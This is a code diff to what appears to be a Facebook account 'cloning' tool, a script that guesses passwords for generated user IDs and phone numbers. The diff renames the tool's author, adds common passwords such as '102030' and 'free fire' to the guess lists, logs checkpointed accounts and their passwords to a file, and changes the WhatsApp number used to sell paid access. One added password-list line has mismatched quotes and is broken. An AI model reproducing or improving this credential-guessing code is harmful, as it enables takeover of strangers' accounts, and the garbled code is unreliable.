@@ -97,22 +97,20 @@ today = date.today()
 #os.system('xdg-open https://youtube.com/@sudairafridi')
 os.system('espeak -a 300 "WELCOME TO SAMIR RANDOM CLONING TOOLS"')
 logo=("""\033[1;37m
-        \033[1;34m
-     \033[1;35m
-           \033[1;36m
-           
-    \033[1;38m 
-       \033[1;97mX PATHAN                                        
-----------------------------------------------
-AUTHER    :  HASAN
-TEAM :  X74
-BROTHER : ALI XD RAMZAN TRT   MUSA 
-Facebook : SUDAIR KHAN
-CRACK :: RANDOM LUSH 
-CRACK Type : FREE + UPDATE DONE 
---------------------------------------------
-\033[1: VERSION : 1.0
-------------------------------------------
+
+
+
+
+
+
+
+_____________________________
+Auther        :  DEVHIS
+GitHub        :  X74TEAM
+Facebook   : HASAN IMAM
+Tools Type : FREE
+Version       : 1.0
+_____________________________
 """)
 
 loop = 0
@@ -260,7 +258,7 @@ def sudair_email():
         clear()
         tl = str(len(user))
         sudair_Hasan('\033[1;97m====================================================')
-        sudair_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+        sudair_Hasan(f'[{xr}^{x}]\033[0;92m YOUR TOTAL IDS: {xr}'+tl)
         sudair_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
         sudair_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
         sudair_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
@@ -268,7 +266,7 @@ def sudair_email():
         sudair_Hasan('\033[1;97m====================================================')
         for love in user:
             sudairuser=fastname+code+lasttname+love
-            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire',fastname+'123',lasttname+'123','102030','203040','304050','405060']
+            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire','102030','203040','304050','405060','fastname+'123','lasttname+'123']
             uid = sudairuser+'@gmail.com'
             for Eman in HamiiID:
                 pwx.append(Eman)
@@ -313,7 +311,7 @@ def sudair_bd():
         sudair_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
         sudair_Hasan('\033[1;97m====================================================')
         for love in user:
-            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire']
+            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire','102030','203040','304050','405060']
             uid = code+love
             for sudair in HamiiID:
                 pwx.append(sudair)
@@ -359,7 +357,7 @@ def sudair_pk():
         sudair_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
         sudair_Hasan('\033[1;97m====================================================')
         for love in user:
-            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan']
+            pwx = [love[3:],code+love,love[1:],'khankhan','khan1122','khan12','khan123','khan123456','i love you','free fire','pakistan','102030','203040','304050','405060']
             uid = code+love
             for sudair in HamiiID:
                 pwx.append(sudair)
@@ -425,14 +423,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m[sudair-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                sn4gdh9('/sdcard/sudair-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print('\r\r\33[1;30m[CP ID] ' +uid+ ' • ' +ps+           '  \33[0;97m')
+                sn4gdh9('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' • '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}sudair{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}ACTIVE{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -463,7 +461,7 @@ def reg():
         print (' \x1b[1;92mCopy the id and send to Admin')
         print (' \x1b[1;92mYour id : ' + to)
         input('\x1b[1;93m Press enter to send id')
-        os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20sudair%20Paid%20Tools.%20My%20Key:%20'+id+sudair)
+        os.system('am start https://wa.me/+8801700909089?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20DEVHIS%20Paid%20Tools.%20My%20Key:%20'+id+sudair)
         reg()
 
 
